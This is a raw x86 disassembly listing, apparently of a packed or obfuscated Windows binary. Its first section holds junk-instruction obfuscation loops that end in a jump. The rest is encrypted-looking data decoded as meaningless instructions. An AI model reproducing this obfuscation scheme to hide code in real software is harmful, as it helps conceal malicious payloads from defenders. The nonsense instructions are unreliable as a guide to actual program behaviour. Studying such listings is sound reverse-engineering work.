  4191f8:	mov    edx,DWORD PTR [ebp-0x10]
  4191fb:	xor    edx,eax
  4191fd:	add    edx,esi
  4191ff:	jne    0x416a2c
  419205:	jmp    0x41931c
  41920a:	mov    ecx,DWORD PTR [ebp-0x14]
  41920d:	mov    DWORD PTR [ebp+0x8],ecx
  419210:	jmp    0x419289
  419215:	mov    ecx,DWORD PTR [ebp+0x8]
  419218:	mov    edx,DWORD PTR [ebp-0x8]
  41921b:	xor    ecx,eax
  41921d:	xor    edx,eax
  41921f:	sub    ecx,edx
  419221:	sub    ecx,esi
  419223:	xor    ecx,eax
  419225:	mov    DWORD PTR [ebp+0x8],ecx
  419228:	mov    ecx,DWORD PTR [ebp+0x8]
  41922b:	mov    edx,DWORD PTR [ebp-0x58]
  41922e:	add    ecx,0x5708e4
  419234:	imul   ecx,edx
  419237:	mov    DWORD PTR [ebp-0x58],ecx
  41923a:	mov    ecx,DWORD PTR [ebp+0x8]
  41923d:	mov    edx,DWORD PTR [ebp-0x54]
  419240:	add    ecx,0x64f882
  419246:	or     ecx,edx
  419248:	mov    DWORD PTR [ebp-0x54],ecx
  41924b:	mov    ecx,DWORD PTR [ebp+0x8]
  41924e:	mov    edx,DWORD PTR [ebp-0x50]
  419251:	add    ecx,0x242ebf1
  419257:	xor    ecx,edx
  419259:	mov    DWORD PTR [ebp-0x50],ecx
  41925c:	mov    ecx,DWORD PTR [ebp+0x8]
  41925f:	mov    edx,DWORD PTR [ebp-0x4c]
  419262:	add    ecx,edi
  419264:	and    ecx,edx
  419266:	mov    DWORD PTR [ebp-0x4c],ecx
  419269:	mov    ecx,DWORD PTR [ebp+0x8]
  41926c:	mov    edx,DWORD PTR [ebp-0x48]
  41926f:	lea    ecx,[edx+ecx*1+0x241fcdf]
  419276:	mov    DWORD PTR [ebp-0x48],ecx
  419279:	mov    ecx,DWORD PTR [ebp+0x8]
  41927c:	mov    edx,0xfa5e1522
  419281:	sub    edx,ecx
  419283:	add    edx,DWORD PTR [ebp-0x44]
  419286:	mov    DWORD PTR [ebp-0x44],edx
  419289:	mov    ecx,DWORD PTR [ebp+0x8]
  41928c:	xor    ecx,eax
  41928e:	add    ecx,esi
  419290:	jne    0x419215
  419296:	jmp    0x419328
  41929b:	mov    ecx,DWORD PTR [ebp+0x8]
  41929e:	mov    edx,DWORD PTR [ebp-0x8]
  4192a1:	xor    ecx,eax
  4192a3:	xor    edx,eax
  4192a5:	sub    ecx,edx
  4192a7:	sub    ecx,esi
  4192a9:	xor    ecx,eax
  4192ab:	mov    DWORD PTR [ebp+0x8],ecx
  4192ae:	mov    ecx,DWORD PTR [ebp+0x8]
  4192b1:	mov    edx,DWORD PTR [ebp-0x58]
  4192b4:	add    ecx,0x5708e4
  4192ba:	imul   ecx,edx
  4192bd:	mov    DWORD PTR [ebp-0x58],ecx
  4192c0:	mov    ecx,DWORD PTR [ebp+0x8]
  4192c3:	mov    edx,DWORD PTR [ebp-0x54]
  4192c6:	add    ecx,0x64f882
  4192cc:	or     ecx,edx
  4192ce:	mov    DWORD PTR [ebp-0x54],ecx
  4192d1:	mov    ecx,DWORD PTR [ebp+0x8]
  4192d4:	mov    edx,DWORD PTR [ebp-0x50]
  4192d7:	add    ecx,0x242ebf1
  4192dd:	xor    ecx,edx
  4192df:	mov    DWORD PTR [ebp-0x50],ecx
  4192e2:	mov    ecx,DWORD PTR [ebp+0x8]
  4192e5:	mov    edx,DWORD PTR [ebp-0x4c]
  4192e8:	add    ecx,edi
  4192ea:	and    ecx,edx
  4192ec:	mov    DWORD PTR [ebp-0x4c],ecx
  4192ef:	mov    ecx,DWORD PTR [ebp+0x8]
  4192f2:	mov    edx,DWORD PTR [ebp-0x48]
  4192f5:	lea    ecx,[edx+ecx*1+0x241fcdf]
  4192fc:	mov    DWORD PTR [ebp-0x48],ecx
  4192ff:	mov    ecx,DWORD PTR [ebp+0x8]
  419302:	mov    edx,0xfa5e1522
  419307:	sub    edx,ecx
  419309:	add    edx,DWORD PTR [ebp-0x44]
  41930c:	mov    DWORD PTR [ebp-0x44],edx
  41930f:	mov    ecx,DWORD PTR [ebp+0x8]
  419312:	xor    ecx,eax
  419314:	add    ecx,esi
  419316:	jne    0x41929b
  41931c:	mov    ecx,DWORD PTR [ebp-0x8]
  41931f:	xor    ecx,eax
  419321:	mov    eax,DWORD PTR [ebp+0x10]
  419324:	add    ecx,esi
  419326:	mov    DWORD PTR [eax],ecx
  419328:	pop    edi
  419329:	pop    esi
  41932a:	pop    ebx
  41932b:	leave  
  41932c:	ret    0xc
  41932f:	push   ebp
  419330:	mov    ebp,esp
  419332:	sub    esp,0x78
  419335:	and    DWORD PTR ds:0x428eaf,0x46d6
  41933f:	push   esi
  419340:	push   edi
  419341:	or     eax,DWORD PTR ds:0x428e37
  419347:	mov    eax,ds:0x428373
  41934c:	or     ecx,edi
  41934e:	mov    DWORD PTR [ebp-0x24],eax
  419351:	and    DWORD PTR ds:0x428eb3,0x0
  41935b:	jmp    0x41936b
  419360:	mov    eax,ds:0x428eb3
  419365:	inc    eax
  419366:	mov    ds:0x428eb3,eax
  41936b:	cmp    DWORD PTR ds:0x428eb3,0x15
  419372:	jae    0x41939a
  419378:	cmp    DWORD PTR ds:0x428eb3,0x21
  41937f:	ja     0x41939a
  419385:	jmp    0x419395
  41938a:	push   0x6ea1
  41938f:	call   DWORD PTR ds:0x42a9d7
  419395:	jmp    0x419360
  41939a:	mov    eax,ds:0x428493
  41939f:	mov    DWORD PTR [ebp-0x30],eax
  4193a2:	mov    DWORD PTR [ebp-0x2c],0xf89c85a5
  4193a9:	sub    DWORD PTR ds:0x428e3f,edi
  4193af:	mov    DWORD PTR [ebp-0x28],0xf89c85a4
  4193b6:	mov    eax,DWORD PTR [ebp-0x10]
  4193b9:	mov    ecx,DWORD PTR [ebp-0x10]
  4193bc:	sub    eax,ecx
  4193be:	mov    DWORD PTR [ebp-0x10],eax
  4193c1:	and    DWORD PTR ds:0x428e93,edi
  4193c7:	xor    DWORD PTR [ebp-0x10],0xf89cb5a5
  4193ce:	adc    ecx,0x318b
  4193d4:	mov    eax,DWORD PTR [ebp-0x18]
  4193d7:	mov    ecx,DWORD PTR [ebp-0x18]
  4193da:	xor    DWORD PTR ds:0x428e8f,edi
  4193e0:	sub    eax,ecx
  4193e2:	mov    DWORD PTR [ebp-0x18],eax
  4193e5:	sbb    DWORD PTR ds:0x428e5b,ebx
  4193eb:	or     DWORD PTR [ebp-0x18],0xf89f05a5
  4193f2:	or     DWORD PTR ds:0x428e2f,ebx
  4193f8:	mov    eax,DWORD PTR [ebp-0xc]
  4193fb:	adc    DWORD PTR ds:0x428e47,ecx
  419401:	mov    ecx,DWORD PTR [ebp-0xc]
  419404:	sub    eax,ecx
  419406:	add    DWORD PTR ds:0x428e6f,edx
  41940c:	mov    DWORD PTR [ebp-0xc],eax
  41940f:	and    DWORD PTR ds:0x428eb7,ecx
  419415:	or     DWORD PTR [ebp-0xc],0xf89c85e5
  41941c:	add    DWORD PTR ds:0x428ec7,ebx
  419422:	mov    eax,DWORD PTR [ebp-0x1c]
  419425:	mov    ecx,DWORD PTR [ebp-0x1c]
  419428:	sub    eax,ecx
  41942a:	add    edi,0xa93
  419430:	mov    DWORD PTR [ebp-0x1c],eax
  419433:	or     DWORD PTR ds:0x428e87,0x297e
  41943d:	or     DWORD PTR [ebp-0x1c],0xf89c8585
  419444:	mov    eax,DWORD PTR [ebp-0x20]
  419447:	mov    DWORD PTR ds:0x428e9f,0x15
  419451:	cmp    DWORD PTR ds:0x428e9f,0x0
  419458:	je     0x4194a7
  41945e:	cmp    DWORD PTR ds:0x428e9f,0x5
  419465:	jb     0x4194a7
  41946b:	jmp    0x419479
  419470:	push   DWORD PTR [ebp-0x20]
  419473:	call   DWORD PTR ds:0x42a9db
  419479:	cmp    DWORD PTR ds:0x428e9f,0x6
  419480:	jne    0x419495
  419486:	xor    edi,edi
  419488:	or     edi,DWORD PTR ds:0x428e9f
  41948e:	dec    edi
  41948f:	mov    DWORD PTR ds:0x428e9f,edi
  419495:	mov    edi,DWORD PTR ds:0x428e9f
  41949b:	dec    edi
  41949c:	mov    DWORD PTR ds:0x428e9f,edi
  4194a2:	jmp    0x419451
  4194a7:	mov    ecx,DWORD PTR [ebp-0x20]
  4194aa:	sub    DWORD PTR ds:0x428e73,0x4181
  4194b4:	sub    eax,ecx
  4194b6:	mov    DWORD PTR [ebp-0x20],eax
  4194b9:	neg    edi
  4194bb:	mov    eax,DWORD PTR [ebp-0x2c]
  4194be:	mov    ecx,DWORD PTR [ebp-0x20]
  4194c1:	mov    esi,0x75108af
  4194c6:	xor    eax,esi
  4194c8:	add    DWORD PTR ds:0x428e2f,0x596
  4194d2:	mov    edi,0x3272f6
  4194d7:	or     DWORD PTR ds:0x428e43,0x428e77
  4194e1:	add    eax,edi
  4194e3:	or     eax,ecx
  4194e5:	mov    DWORD PTR ds:0x428e43,0x54e0
  4194ef:	mov    DWORD PTR [ebp-0x20],eax
  4194f2:	add    eax,0x58c9
  4194f7:	mov    eax,DWORD PTR [ebp-0x4]
  4194fa:	jmp    0x41b84d
  4194ff:	imul   edx,DWORD PTR [edi],0x45054527
  419505:	or     DWORD PTR [edi],edx
  419507:	dec    esp
  419508:	xchg   ecx,eax
  419509:	in     al,0xff
  41950b:	(bad)  
  41950c:	jns    0x41953c
  41950e:	pop    esp
  41950f:	pop    ebp
  419510:	and    BYTE PTR [edx-0x7c9fb27d],al
  419516:	xor    eax,0x56
  419519:	out    0x33,al
  41951b:	sub    dl,BYTE PTR [eax+ebx*8+0x75f493f8]
  419522:	sbb    al,0x5f
  419524:	scas   eax,DWORD PTR es:[edi]
  419525:	jne    0x419594
  419527:	outs   dx,BYTE PTR ds:[esi]
  419528:	lock addr16 out 0x1e,al
  41952c:	fbstp  TBYTE PTR [eax-0x36]
  41952f:	loop   0x4194f7
  419531:	cwde   
  419532:	popf   
  419533:	inc    edx
  419534:	ret    0xdbad
  419537:	stos   BYTE PTR es:[edi],al
  419538:	(bad)  
  419539:	fwait
  41953a:	inc    esi
  41953b:	stos   DWORD PTR es:[edi],eax
  41953c:	sahf   
  41953d:	arpl   dx,bp
  41953f:	test   BYTE PTR ds:0x36cef491,dh
  419545:	mov    al,ds:0x22fae079
  41954a:	stos   DWORD PTR es:[edi],eax
  41954b:	adc    esi,DWORD PTR [eax]
  41954d:	das    
  41954e:	jle    0x419523
  419550:	inc    ecx
  419551:	stos   DWORD PTR es:[edi],eax
  419552:	mov    DWORD PTR [ecx],esi
  419554:	inc    ebx
  419555:	lds    ebx,FWORD PTR [ecx]
  419557:	pop    ebx
  419558:	(bad)  
  41955a:	lock sub DWORD PTR [ebx+0x20c3face],ebx
  419561:	adc    DWORD PTR [esi+0x27850460],eax
  419567:	sahf   
  419568:	inc    ebx
  419569:	daa    
  41956a:	mov    dl,0x6
  41956c:	lods   al,BYTE PTR ds:[esi]
  41956d:	pop    ecx
  41956e:	inc    eax
  41956f:	iret   
  419570:	(bad)  
  419571:	adc    eax,0x7d249355
  419576:	int    0xc5
  419578:	mov    cl,0x2e
  41957a:	mov    ch,0x61
  41957c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41957d:	icebp  
  41957e:	test   eax,0x747586ce
  419583:	xor    cl,BYTE PTR [eax+0x3b819624]
  419589:	loop   0x4195e8
  41958b:	lods   eax,DWORD PTR ds:[esi]
  41958c:	jmp    0x419581
  41958e:	ins    BYTE PTR es:[edi],dx
  41958f:	adc    DWORD PTR [ecx],edi
  419591:	test   al,0x70
  419593:	jge    0x419562
  419595:	les    ebx,FWORD PTR [eax+0x7a]
  419598:	test   al,0x68
  41959a:	mov    bl,BYTE PTR [edi-0x6c]
  41959d:	mov    al,ds:0xd54607de
  4195a2:	mov    ebp,0xa962651
  4195a7:	jge    0x419616
  4195a9:	fmul   st(3),st
  4195ab:	addr16 dec eax
  4195ad:	int    0xc4
  4195af:	loope  0x41962f
  4195b1:	push   ebx
  4195b2:	push   esp
  4195b3:	dec    BYTE PTR [edi+0x1af34273]
  4195b9:	push   ss
  4195ba:	push   0x8e15a54
  4195bf:	(bad)  
  4195c0:	adc    esi,esi
  4195c2:	add    eax,0x84dbff0b
  4195c7:	repnz (bad) 
  4195c9:	jbe    0x419615
  4195cb:	aaa    
  4195cc:	inc    eax
  4195cd:	pop    es
  4195ce:	repz push ebp
  4195d0:	jg     0x41960f
  4195d2:	sbb    eax,DWORD PTR [bx]
  4195d5:	pop    es
  4195d6:	fwait
  4195d7:	xor    DWORD PTR [ebx+ecx*2-0x3c],0xa6f2afe
  4195df:	stc    
  4195e0:	fs jb  0x419637
  4195e3:	dec    eax
  4195e4:	les    edi,FWORD PTR [ebp+ebx*1-0x54f6c612]
  4195eb:	sub    esp,eax
  4195ed:	sbb    bl,dl
  4195ef:	sub    eax,0x6a561adc
  4195f4:	in     eax,dx
  4195f5:	dec    edx
  4195f6:	pop    es
  4195f7:	or     eax,0xe4b36038
  4195fc:	stos   DWORD PTR es:[edi],eax
  4195fd:	pop    ebx
  4195fe:	jmp    0x4195f2
  419600:	xchg   edx,eax
  419601:	das    
  419602:	inc    edx
  419603:	jae    0x41963b
  419605:	jmp    0x3f360165
  41960a:	pop    edi
  41960b:	shl    BYTE PTR [ecx+0x8],1
  41960e:	xchg   ecx,eax
  41960f:	ins    BYTE PTR es:[edi],dx
  419610:	retf   
  419611:	xor    BYTE PTR [ebp-0x6d5ee359],0xe
  419618:	(bad)  
  419619:	out    dx,eax
  41961a:	mov    WORD PTR [edi+0x5e],?
  41961d:	adc    BYTE PTR [ecx],dh
  41961f:	adc    edx,0x63e778a9
  419625:	out    0x48,eax
  419627:	or     al,BYTE PTR [edi+0x32]
  41962a:	or     eax,0x5ca35091
  41962f:	jmp    0x419601
  419631:	into   
  419632:	jmp    0x4820:0x639ab3c1
  419639:	mov    edx,0x4df96b2f
  41963e:	push   0xeb46593f
  419643:	xchg   esp,eax
  419644:	sbb    al,0x73
  419646:	or     DWORD PTR [edx+0x8],esp
  419649:	nop
  41964a:	dec    esi
  41964b:	sbb    ecx,DWORD PTR [ebx+edi*1+0x3ed4f9be]
  419652:	das    
  419653:	push   eax
  419654:	(bad)  
  419655:	into   
  419656:	pop    ebp
  419657:	mov    bl,0xc9
  419659:	and    DWORD PTR ss:[eax],0x73e9912b
  419660:	or     ebx,DWORD PTR [eax+0x3d]
  419663:	cmp    al,0x7d
  419665:	call   0xc867f2d8
  41966a:	mov    ds:0x706b0982,al
  41966f:	test   BYTE PTR [ecx],0x7f
  419672:	cmp    eax,0xe8af210a
  419677:	or     BYTE PTR [edi+0x35],cl
  41967a:	mov    ch,0xc3
  41967c:	fld    QWORD PTR [esi+0x7666cf9b]
  419682:	cmc    
  419683:	popa   
  419684:	mov    fs,WORD PTR [ebx]
  419686:	lock int 0xc0
  419689:	add    ch,BYTE PTR [esi-0x7a]
  41968c:	sub    ch,ch
  41968e:	xchg   ebp,eax
  41968f:	retf   
  419690:	aam    0x11
  419692:	mov    bh,0x3f
  419694:	sbb    dl,BYTE PTR [ebp*4+0x40e9b84f]
  41969b:	mov    ah,0x12
  41969d:	mov    edi,0xa76d34c4
  4196a2:	data16 into 
  4196a4:	out    0x17,al
  4196a6:	mov    edx,DWORD PTR [eax]
  4196a8:	xchg   edi,eax
  4196a9:	(bad)  
  4196aa:	mov    edx,?
  4196ac:	test   al,0x98
  4196ae:	test   BYTE PTR [esi-0x588cccbf],ch
  4196b4:	test   DWORD PTR ds:0x88d592ff,ebp
  4196ba:	mov    dh,0xb1
  4196bc:	pop    eax
  4196bd:	ror    DWORD PTR [ebp+0x7],cl
  4196c0:	or     eax,0x5cc5f3b3
  4196c5:	push   ds
  4196c6:	mov    ebx,DWORD PTR [ecx+0x46af2903]
  4196cc:	dec    ebx
  4196cd:	push   edi
  4196ce:	out    dx,eax
  4196cf:	inc    eax
  4196d0:	jns    0x419677
  4196d2:	sbb    eax,0xeb5e4a36
  4196d7:	pusha  
  4196d8:	dec    ebp
  4196d9:	enter  0x61ea,0x71
  4196dd:	mov    ah,0x2c
  4196df:	(bad)  
  4196e1:	add    eax,0xb6094ab0
  4196e6:	lock mov bl,0x0
  4196e9:	push   ecx
  4196ea:	add    eax,0x9ef57ec4
  4196ef:	aad    0x1a
  4196f1:	push   ecx
  4196f2:	xchg   ecx,eax
  4196f3:	fdivr  st(3),st
  4196f5:	xchg   ebx,eax
  4196f6:	mov    esp,cs
  4196f8:	mov    al,0x14
  4196fa:	or     bl,BYTE PTR [ebx]
  4196fc:	je     0x4196c9
  4196fe:	pop    ebx
  4196ff:	cmp    esp,esi
  419701:	call   0xcd09:0x6a2faae7
  419708:	rol    BYTE PTR [edi+0x65],1
  41970b:	mov    bh,0xf5
  41970d:	lea    ebx,[edx-0x37]
  419710:	adc    BYTE PTR [eax-0x21],bl
  419713:	js     0x4196da
  419715:	int3   
  419716:	daa    
  419717:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419718:	xchg   ebp,eax
  419719:	mov    ecx,0x81c57e97
  41971e:	cwde   
  41971f:	stc    
  419720:	(bad)
  419724:	mov    ebx,esi
  419726:	sahf   
  419727:	popa   
  419728:	cs push esi
  41972a:	dec    ebp
  41972b:	jae    0x419708
  41972d:	push   edx
  41972e:	out    dx,eax
  41972f:	push   ds
  419730:	cmp    DWORD PTR [eax+0xa],edi
  419733:	std    
  419734:	icebp  
  419735:	cmc    
  419736:	sahf   
  419737:	push   edx
  419738:	cmp    BYTE PTR [edi-0x7c],bh
  41973b:	and    BYTE PTR [edi+0x704dd6c0],bh
  419741:	xchg   edx,eax
  419742:	les    esp,FWORD PTR [edi-0x1]
  419745:	xchg   edi,eax
  419746:	aas    
  419747:	in     eax,0xe7
  419749:	and    al,0x1a
  41974b:	mov    ah,0x89
  41974d:	jb     0x41979e
  41974f:	xchg   esp,eax
  419750:	inc    edx
  419751:	cmp    eax,0x2102e501
  419756:	sbb    al,0x59
  419758:	sbb    BYTE PTR [eax-0x8fc185e],dl
  41975e:	mov    ah,0x89
  419760:	jno    0x4197d1
  419762:	ins    BYTE PTR es:[edi],dx
  419763:	xor    bh,BYTE PTR [ebx+ecx*4-0x3d]
  419767:	stos   BYTE PTR es:[edi],al
  419768:	or     edx,eax
  41976a:	push   cs
  41976b:	mov    ebx,0xa2653fa8
  419770:	jae    0x419725
  419772:	test   BYTE PTR [edi+ebp*1+0x740eafdf],dh
  419779:	pop    edi
  41977a:	cld    
  41977b:	dec    ecx
  41977c:	outs   dx,DWORD PTR ds:[esi]
  41977e:	xor    DWORD PTR [ebx-0x48],ecx
  419781:	test   DWORD PTR [ebp+0x4e],esp
  419784:	dec    eax
  419785:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419786:	les    eax,FWORD PTR ds:0x6a0773ec
  41978c:	imul   DWORD PTR ds:0xc57b7878
  419792:	scas   al,BYTE PTR es:[edi]
  419793:	jle    0x4197c6
  419795:	dec    ebx
  419796:	mov    esp,0xe9af26aa
  41979b:	mov    edi,0x620c402b
  4197a0:	xchg   esp,eax
  4197a1:	xor    ch,BYTE PTR [edx+eax*4]
  4197a4:	mov    esp,0x455c79e0
  4197a9:	jbe    0x419771
  4197ab:	jle    0x419784
  4197ad:	pushf  
  4197ae:	and    eax,0xb57ec34f
  4197b3:	ror    edi,1
  4197b5:	xchg   ebx,eax
  4197b6:	neg    DWORD PTR [edx-0x7f]
  4197b9:	mov    cl,0xc4
  4197bb:	or     eax,0x6d59648e
  4197c0:	imul   ebp,DWORD PTR [eax-0x6a],0x931ab089
  4197c7:	mov    dh,0xf5
  4197c9:	shr    BYTE PTR ds:0xd8adb12c,cl
  4197cf:	test   eax,0xfddbfdf8
  4197d4:	aam    0x9b
  4197d6:	ds dec edx
  4197d8:	mov    esi,0x59e05a2e
  4197dd:	xchg   ebx,eax
  4197de:	xor    eax,0x2f60bdc5
  4197e3:	dec    ecx
  4197e4:	sbb    eax,0x4345f2b9
  4197e9:	pop    edx
  4197ea:	ja     0x4197b0
  4197ec:	sahf   
  4197ed:	sbb    DWORD PTR ds:[eax],edi
  4197f0:	stos   DWORD PTR es:[edi],eax
  4197f1:	icebp  
  4197f2:	cmp    esi,DWORD PTR [edi]
  4197f4:	pop    ds
  4197f5:	mov    dh,0x3b
  4197f7:	(bad)  
  4197f8:	retf   0xdaa6
  4197fb:	stc    
  4197fc:	in     al,dx
  4197fd:	xchg   edx,eax
  4197fe:	rol    esp,1
  419800:	ret    0x28ff
  419803:	sbb    eax,0x7de7540b
  419808:	add    al,0x1b
  41980a:	dec    edx
  41980b:	popf   
  41980c:	(bad)  
  41980d:	imul   dh
  41980f:	cmc    
  419810:	jmp    0xe0aa:0x4030a77f
  419817:	hlt    
  419818:	sub    eax,0xa4de3234
  41981d:	out    dx,al
  41981e:	mov    edx,0x4e1fff2
  419823:	xor    DWORD PTR [esi+ecx*2-0x2bdd8959],0x3561c9a3
  41982e:	cs fcomip st,st(2)
  419831:	push   0x70
  419833:	imul   esp,DWORD PTR [edi],0x1ec87945
  419839:	neg    BYTE PTR [edx]
  41983b:	and    DWORD PTR [ebp+0x1a199099],esp
  419841:	dec    ebx
  419842:	mov    esi,0x5b067266
  419847:	les    ebx,FWORD PTR [ecx-0x3c86ab]
  41984d:	(bad)  
  41984e:	jno    0x4197f3
  419850:	arpl   WORD PTR [edi],ax
  419852:	jg     0x4197f4
  419854:	push   edx
  419855:	aad    0xa0
  419857:	ss adc dh,dh
  41985a:	(bad)  
  41985c:	fcmovnbe st,st(6)
  41985e:	pop    ebx
  41985f:	adc    al,BYTE PTR [eax+ebx*8-0x2]
  419863:	ret    0xcce
  419866:	inc    cl
  419868:	leave  
  419869:	mov    dh,0x55
  41986b:	out    dx,eax
  41986c:	mov    WORD PTR [eax],cs
  41986e:	cmp    eax,DWORD PTR [eax-0x35]
  419871:	out    dx,eax
  419872:	push   esp
  419873:	(bad)  
  419874:	or     eax,0x42599d83
  419879:	adc    al,0x67
  41987b:	xchg   ebx,eax
  41987c:	mov    bh,0xed
  41987e:	das    
  41987f:	shl    BYTE PTR [ebx-0x23a7ba0b],1
  419885:	mov    ebx,0x4d2e11a7
  41988a:	adc    edi,edi
  41988c:	pop    eax
  41988d:	sahf   
  41988e:	fsubp  st(7),st
  419890:	scas   eax,DWORD PTR es:[edi]
  419891:	rcr    DWORD PTR [ebx],0x39
  419894:	aam    0x2
  419896:	inc    edx
  419897:	test   BYTE PTR [ecx],ch
  419899:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41989a:	fdiv   QWORD PTR [ebx-0x53107901]
  4198a0:	(bad)  
  4198a2:	out    0x2f,eax
  4198a4:	bound  esi,QWORD PTR [ebx+0x6f]
  4198a7:	adc    esi,DWORD PTR [esi+eiz*2]
  4198aa:	jecxz  0x4198ec
  4198ac:	and    al,0x85
  4198ae:	sbb    eax,0x1d101fe1
  4198b3:	(bad)  
  4198b4:	and    al,0x35
  4198b6:	jo     0x4198bc
  4198b8:	smsw   WORD PTR [ebx]
  4198bb:	out    dx,al
  4198bc:	inc    esp
  4198bd:	sar    DWORD PTR [ecx+0x26d04048],1
  4198c3:	jb     0x4198f1
  4198c5:	xor    al,0x16
  4198c7:	push   edx
  4198c8:	mov    dl,0x99
  4198ca:	outs   dx,DWORD PTR ds:[esi]
  4198cb:	test   eax,0x935f99dc
  4198d0:	bound  ebx,QWORD PTR [eax]
  4198d2:	push   eax
  4198d3:	dec    ecx
  4198d4:	inc    esp
  4198d5:	push   edx
  4198d6:	sbb    eax,0x3f4486a4
  4198db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4198dc:	fdivr  DWORD PTR [edx]
  4198de:	test   eax,0x929462d5
  4198e3:	mov    dl,0xa5
  4198e5:	dec    edi
  4198e6:	jmp    0x41991e
  4198e8:	xor    eax,0x5e4ebd36
  4198ed:	mov    ss,WORD PTR [eax+0x44]
  4198f0:	cmp    al,0xff
  4198f2:	mov    DWORD PTR gs:[ebx-0x10],eax
  4198f6:	pop    ss
  4198f7:	mul    DWORD PTR [edi*1+0xfeaf56]
  4198fe:	xchg   DWORD PTR [esi+0x2469333b],esp
  419904:	adc    esi,edx
  419906:	cmc    
  419907:	mov    al,0xfb
  419909:	mov    ebp,0x1ea3815e
  41990e:	repnz dec edi
  419910:	xor    DWORD PTR [ebp+0x5f646bd1],edi
  419916:	fucomip st,st(2)
  419918:	pop    ds
  419919:	addr16 pop ss
  41991b:	jmp    0x4219:0x3ebccfce
  419922:	push   esi
  419923:	and    BYTE PTR [edx],0x84
  419926:	push   eax
  419927:	mov    ah,0xc8
  419929:	xor    BYTE PTR [edi],ch
  41992b:	or     DWORD PTR [ecx-0xe966ee6],esp
  419931:	aam    0x9f
  419933:	lahf   
  419934:	je     0x419967
  419936:	push   ebp
  419937:	dec    edi
  419938:	sar    esi,1
  41993a:	les    ecx,FWORD PTR ds:0x5a931fc6
  419940:	out    0xd5,eax
  419942:	inc    ebx
  419943:	mov    ebx,0x1d65dd89
  419948:	cmp    BYTE PTR [edi+0x3f],bl
  41994b:	sbb    DWORD PTR [eax],edx
  41994d:	cmp    BYTE PTR [edi-0x616eb76b],0x71
  419954:	test   eax,0x4f9cadaa
  419959:	int    0x64
  41995b:	rcr    BYTE PTR [ebx+ecx*2-0xd],cl
  41995f:	dec    eax
  419960:	cwde   
  419961:	sub    ebx,edx
  419963:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419964:	xor    esi,ebx
  419966:	out    dx,eax
  419967:	ret    
  419968:	mov    ah,0xc3
  41996a:	push   ss
  41996b:	loope  0x41995e
  41996d:	stos   BYTE PTR es:[edi],al
  41996e:	shl    BYTE PTR [ecx+0x28dbf122],0x4c
  419975:	scas   eax,DWORD PTR es:[edi]
  419976:	paddd  mm3,QWORD PTR [ecx+0x3d]
  41997a:	pop    edx
  41997b:	mov    al,ds:0xe3e3fde6
  419980:	popa   
  419981:	sub    eax,0x395aa7c9
  419986:	rcr    eax,1
  419988:	mov    bl,0x5a
  41998a:	fisubr DWORD PTR [esp+ecx*4-0x6a]
  41998e:	in     eax,0x76
  419990:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419991:	push   cs
  419992:	dec    eax
  419993:	retf   0xaa4b
  419996:	leave  
  419997:	sbb    edx,DWORD PTR [ebp+0x4a]
  41999a:	jnp    0x4199f6
  41999c:	aas    
  41999d:	and    edx,DWORD PTR [ebp+edx*1-0x6125e52f]
  4199a4:	int    0xb2
  4199a6:	gs cmp eax,0xfc180578
  4199ac:	nop
  4199ad:	inc    esi
  4199ae:	cli    
  4199af:	sub    ecx,DWORD PTR [ebx+ecx*2]
  4199b2:	add    BYTE PTR [esi+eiz*4],0x47
  4199b6:	xor    BYTE PTR [ebx-0x82709b4],al
  4199bc:	inc    esi
  4199bd:	push   ss
  4199be:	jecxz  0x419a00
  4199c0:	bound  ebx,QWORD PTR [edi+0x6f98560a]
  4199c6:	shl    esp,0x34
  4199c9:	or     eax,0xde2a18ad
  4199ce:	cwde   
  4199cf:	pop    esp
  4199d0:	ss jp  0x419982
  4199d3:	xchg   BYTE PTR [ebp+0x3a],dh
  4199d6:	repz mov edi,cs
  4199d9:	scas   al,BYTE PTR es:[edi]
  4199da:	fistp  QWORD PTR [ebx]
  4199dc:	aas    
  4199dd:	push   ds
  4199de:	and    BYTE PTR [edx+0x209fe334],bh
  4199e4:	retf   
  4199e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4199e6:	outs   dx,DWORD PTR ds:[esi]
  4199e7:	mov    al,0xef
  4199e9:	jge    0x4199a9
  4199eb:	jp     0x4199eb
  4199ed:	xchg   esi,eax
  4199ee:	int3   
  4199ef:	cwde   
  4199f0:	sti    
  4199f1:	out    0x73,al
  4199f3:	mov    eax,esp
  4199f5:	gs add eax,ecx
  4199f8:	pushf  
  4199f9:	out    dx,al
  4199fa:	cmp    DWORD PTR [ebp+esi*1+0x6e],edi
  4199fe:	inc    esp
  4199ff:	push   es
  419a00:	mov    bh,0xde
  419a02:	inc    esi
  419a03:	int    0x89
  419a05:	cdq    
  419a06:	ins    BYTE PTR es:[edi],dx
  419a07:	je     0x4199eb
  419a09:	icebp  
  419a0a:	outs   dx,DWORD PTR ds:[esi]
  419a0b:	or     dh,BYTE PTR ds:0xeaebbdd3
  419a11:	mov    eax,0xa3214bb0
  419a16:	and    DWORD PTR [esi+0x7f0b7b33],esp
  419a1c:	jl     0x419a49
  419a1e:	push   ecx
  419a1f:	jae    0x419a7a
  419a21:	or     edx,DWORD PTR [ecx]
  419a23:	or     al,al
  419a25:	add    DWORD PTR [ecx+ecx*4],0x1
  419a29:	inc    ecx
  419a2a:	push   esp
  419a2b:	ss push es
  419a2d:	mov    ch,0x75
  419a2f:	fiadd  WORD PTR [ebx+edi*2+0x16]
  419a33:	inc    esi
  419a34:	test   al,0x27
  419a36:	jg     0x4199d2
  419a38:	int3   
  419a39:	jo     0x419a23
  419a3b:	aad    0xc2
  419a3d:	ffree  st(4)
  419a3f:	inc    ebx
  419a40:	mov    dl,0x85
  419a42:	mov    bh,0x8e
  419a44:	in     eax,dx
  419a45:	shr    BYTE PTR [edi+0x182fa37b],cl
  419a4b:	pop    es
  419a4c:	retf   
  419a4d:	xchg   esp,eax
  419a4e:	icebp  
  419a4f:	into   
  419a50:	imul   esp,ebp,0xcc78d53d
  419a56:	lock mov edx,0xf0c2b348
  419a5c:	inc    esi
  419a5d:	mov    ds:0x77557e13,al
  419a62:	(bad)  
  419a63:	(bad)  
  419a64:	sub    eax,0x19e2ef24
  419a69:	jmp    0x8a1aa6a6
